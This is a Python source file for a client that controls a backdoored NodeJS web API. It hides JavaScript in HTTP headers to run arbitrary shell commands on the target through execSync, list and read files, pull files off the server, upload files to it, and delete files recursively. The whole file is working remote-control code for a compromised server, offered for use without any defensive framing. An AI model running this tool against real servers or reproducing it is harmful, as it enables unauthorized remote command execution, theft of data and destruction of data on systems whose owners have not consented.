from pathlib import Path  # get filename
import requests  # HTTP requests
import base64  # encode commands
from Exceptions import *
from ExploitProcessor import ExploitProcessor
# TODO: Convert Sync to Async
"""
@brief The NodeExploitProcessor class is an abstract class that accepts commands
        passed into it and processes it to be sent to the backdoored NodeJS API.
        Inherits from the ExploitProcessor class. 
"""
class NodeExploitProcessor(ExploitProcessor):
    def __init__(self, host: str, path: str, method: str, header: str):
        super().__init__(host, path, method, header)

    """
    @brief See base class for details.
    """
    def get_name(self):
        return "Classic ASP"
    
    """
    @brief See base class for details.
    """
    def _Base__make_connection(self):
        try:
            return self._Base__send_message(
                f"r.setHeader('{self.header}', process.cwd());"
                f"r.end();")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, "
                                   f"and METHOD are correct.")
    
    """
    @brief See base class for details.
    """
    def _Base__send_message(self, message: str):
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            return response.headers[self.header]
        except:
            raise CommandException(f"Message was not successfully processed.")
        
    """
    @brief Run a command on the target machine, and return its output as a
            string.
    @param command the command to be ran as a string
    @return a string of the output from the server, will be blank if it fails.
    @throw CommandException if there is a connection error.
    """
    def __run(self, command: str):  # relies on execSync being imported
        encoded = base64.b64encode(command.encode()).decode()
        out = self.__eval(f"try {{"
                            f"let out = execSync(Buffer.from('{encoded}',"
                                f"'base64').toString('ascii'),"
                                f"{{cwd: '{self.directory}'}});"
                            f"r.setHeader('{self.header}',"
                                f"Buffer.from(out).toString('base64'));}}"
                          f"catch (e){{"
                            f"r.setHeader('{self.header}',"
                            f"'RXJyb3IgcnVubmluZyBjb21tYW5kLgo=');}}"
                          f"r.end();")
        return base64.b64decode(out).decode()
    """
    @brief Run commands to be evaluated as JS code.
    @param command the command to be ran as a string
    @return any output received from the HTTP header.
    @throw CommandException if there is a connection error.
    """
    def __eval(self, command: str):
        out = self._Base__send_message(
            f"process.chdir('{self.directory}');"
            f"{command}")
        return out

    """
    @brief See base class for details.
    """
    def _Base__version(self, options: str):
        out = self.__eval(f"r.setHeader('{self.header}', "
                          f"Buffer.from(process.versions.node)."
                            f"toString('base64'));"
                          f"r.end();")
        print(base64.b64decode(out).decode())

    """
    @brief Check if a file exists on the server.
    @param name the filename to be checked.
    @return a bool indicating whether or not the file exists.
    @throw CommandException if there is a connection error.
    """
    def __file_exists(self, name: str):
        out = self.__eval(
            f"r.setHeader('{self.header}',"
            f"Number(fs.existsSync('{name}')).toString());"
            f"r.end();"
        )
        return out == '1'

    """
    @brief See base class for details.
    """
    def _Base__pwd(self, options: str):
        out = self.__eval(f"r.setHeader('{self.header}', "
                          f"Buffer.from(process.cwd()).toString('base64'));"
                          f"r.end();")
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__ls(self, options: str):  # relies on fs being imported
        out = self.__eval(f"r.setHeader('{self.header}', "
                          f"Buffer.from("
                            f"fs.readdirSync(process.cwd()).join(' '))"
                            f".toString('base64'));"
                          f"r.end();")
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__run(self, options: str): 
        out = self.__run(options)
        print(out, end='')

    """
    @brief See base class for details.
    """
    def _Base__cd(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a path.")
        out = self.__eval(f"process.chdir('{options}');"
                          f"r.setHeader('{self.header}', "
                          f"Buffer.from(process.cwd()).toString('base64'));"
                          f"r.end();")
        self.directory = base64.b64decode(out).decode()
        print(self.directory)

    """
    @brief See base class for details.
    """
    def _Base__cat(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to print.")
        out = self.__eval(f"let out='Error opening file.';"
                          f"if(!fs.existsSync('{options}')){{"
                            f"out='File does not exist.';"
                          f"}}else{{"
                            f"try {{"
                                f"out=fs.readFileSync('{options}', 'utf-8');"
                            f"}} catch (e) {{"
                                f"out='Error opening file.';"
                            f"}}"
                          f"}}"
                          f"r.setHeader('{self.header}',"
                          f"Buffer.from(out).toString('base64'));"
                          f"r.end();")
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__download(self, options: str):  # relies on fs import
        if len(options) == 0:
            raise CommandException("Specify a file to download.")
        
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            message = (f"process.chdir('{self.directory}');"
                       f"let out='File does not exist';"
                       f"if(fs.existsSync('{options}')){{"
                        f"try{{"
                            f"let data=fs.readFileSync('{options}','binary');"
                            f"out='Done.';"
                            f"r.setHeader('{self.header}',out);"
                            f"r.write(data, 'binary');"
                        f"}}catch(e){{"
                            f"out='Error downloading file.';"
                            f"r.setHeader('{self.header}',out);"
                        f"}}"
                       f"}}else{{"
                        f"r.setHeader('{self.header}',out);"
                       f"}}"
                       f"r.end();")
            print("Downloading file...")
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            data = response.content
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            if response.headers.get(self.header) == 'Done.':
                path = Path('downloads/' + Path(options).name)
                path.parent.mkdir(parents=True, exist_ok=True)
                with open(path, "wb") as bin_file:
                    bin_file.write(data)

            print(response.headers[self.header])
        except:
            raise CommandException(f"Message was not successfully processed.")

    """
    @brief See base class for details.
    """
    def _Base__upload(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to upload.")
        local_file_path = Path(options)
        if not local_file_path.exists():
            raise CommandException("File does not exist.")
        if not local_file_path.is_file():
            raise CommandException("File is not a file.")
        
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
            
        try:
            if (self.__file_exists(local_file_path.name)):
                choice = input("Override existing file? [y/N] ")
                if not choice.lower().startswith('y'):
                    return
                
            message = (f"process.chdir('{self.directory}');"
                       f"let body='';"
                       f"i.on('data',(c)=>{{body+=c;}});"
                       f"i.on('end',()=>{{"
                        f"fs.writeFile('{local_file_path.name}',body,"
                            f"(err)=>{{"
                                f"if(err){{"
                                    f"r.setHeader('{self.header}','Fail.');"
                                f"}}else{{"
                                    f"r.setHeader('{self.header}','Done.');"
                                f"}}"
                                f"r.end();"
                            f"}});"
                       f"}});"
            )
            print("Uploading file...")
            binary = local_file_path.read_bytes()

            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message },
                data=binary
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            
            print(response.headers[self.header])
        except:
            raise CommandException(f"Could not upload file.")
        

    """
    @brief See base class for details.
    """
    def _Base__rm(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a filename.")
        out = self.__eval(f"try{{fs.rmSync('{options}',"
                            f"{{recursive:true,force:true}});"
                          f"r.setHeader('{self.header}', "
                          f"'Done.');}}catch(e){{"
                            f"r.setHeader('{self.header}','Failed.');"
                          f"}}"
                          f"r.end();")
        print(out)

    """
    @brief See base class for details.
    """
    def _Base__mkdir(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a path/folder name.")
        out = self.__eval(
                          f"try{{"
                            f"if(fs.existsSync('{options}')){{"
                                f"r.setHeader('{self.header}',"
                                    f"'Already exists.');"
                            f"}}else{{"
                                f"fs.mkdirSync('{options}',"
                                    f"{{recursive:true}});"
                                f"r.setHeader('{self.header}', 'Done.');"
                            f"}}"
                          f"}}catch(e){{"
                            f"r.setHeader('{self.header}','Error.');"
                          f"}}"
                          f"r.end();")
        print(out)        
